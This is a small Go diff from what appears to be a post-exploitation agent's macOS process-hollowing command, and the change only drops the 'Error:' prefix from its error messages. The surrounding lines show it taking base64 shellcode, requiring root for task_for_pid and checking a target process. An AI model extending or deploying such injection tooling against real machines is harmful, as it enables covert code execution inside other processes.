@@ -46,20 +46,20 @@ func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if params.ShellcodeB64 == "" {
-		return errorResult("Error: shellcode_b64 is required")
+		return errorResult("shellcode_b64 is required")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
+		return errorf("decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return errorResult("Error: shellcode is empty")
+		return errorResult("shellcode is empty")
 	}
 
 	if os.Getuid() != 0 {
-		return errorResult("Error: process hollowing on macOS requires root (task_for_pid needs com.apple.security.cs.debugger entitlement or root)")
+		return errorResult("process hollowing on macOS requires root (task_for_pid needs com.apple.security.cs.debugger entitlement or root)")
 	}
 
 	if params.Target == "" {
